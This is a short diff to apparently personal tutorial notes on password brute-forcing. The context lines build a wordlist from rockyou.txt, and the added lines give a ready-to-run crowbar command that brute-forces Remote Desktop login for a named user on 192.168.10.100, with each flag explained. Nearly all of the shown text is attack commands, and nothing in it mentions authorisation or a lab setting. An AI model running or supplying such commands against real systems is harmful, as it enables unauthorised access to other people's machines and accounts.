@@ -10,4 +10,10 @@
    head -n 20 rockyou.txt > password.txt
 7- eddit password.txt file and add your target password for brute force
     nano password.txt
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------
+
+1-Run the rute force attact with the help of crowbar:
+   crowbar -b rdp -u tinashe -C password.txt -s 192.168.10.100/32 ( rdp is remote desktop, -u to specify the username, -C to specify the password file, -s to specify the target IP)
+
  
